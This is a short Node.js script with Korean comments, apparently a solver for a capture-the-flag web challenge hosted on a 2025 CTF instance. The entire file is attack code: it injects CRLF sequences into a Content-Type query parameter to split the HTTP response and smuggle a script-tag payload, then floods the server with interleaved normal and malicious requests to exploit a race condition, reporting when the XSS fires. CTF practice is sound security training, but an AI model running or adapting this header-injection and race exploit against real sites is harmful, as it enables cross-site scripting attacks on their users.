import fetch from 'node-fetch'; // CommonJS 환경

const TARGET = 'https://e9awywik-lost-in-transliteration.instancer.2025.ctfcompetition.com/file';
const FILENAME = 'script.js';

function buildPayload(i, isMalicious) {
  if (isMalicious) {
    // 악성 Content-Type 헤더 인젝션 시도
    return `${TARGET}?filename=${FILENAME}&ct=${encodeURIComponent("text/html\r\nContent-Length:25\r\n\r\n<script>alert("+i+")</script>")}&q=`;
  } else {
    // 정상 Content-Type
    return `${TARGET}?filename=${FILENAME}&ct=${encodeURIComponent("text/html")}&q=`;
  }
}

async function sendRequest(i, isMalicious) {
  const url = buildPayload(i, isMalicious);
  try {
    const res = await fetch(url);
    const text = await res.text();
    if (isMalicious) {
      console.log(`[${isMalicious ? "MAL" : "NOR"}-${i}] Status: ${res.status}, Length: ${text.length}`);
    }
    if (text.includes('<script>alert(')) {
      console.log(`💥 XSS triggered at request ${i}`);
    }
  } catch (e) {
    console.error(`[${isMalicious ? "MAL" : "NOR"}-${i}] Error:`, e.message);
  }
}

async function runRace() {
  const tasks = [];
  for (let i = 0; i < 8; i++) {
    tasks.push(sendRequest(i, false));  // 정상 요청 다수 전송
  }

  // 약간 딜레이 후 악성 요청 몰아서 전송 (레이스 컨디션 유도)
  setTimeout(() => {
    for (let i = 0; i < 2; i++) {
      sendRequest(i, true);
    }
  }, 1);

  await Promise.all(tasks);
}

(async () => {
  for (let attempt = 0; attempt < 100; attempt++) {
    console.log(`\n🔁 Attempt ${attempt}`);
    await runRace();
    await new Promise(res => setTimeout(res, 100));  // 서버 부담 완화용 지연
  }
})();
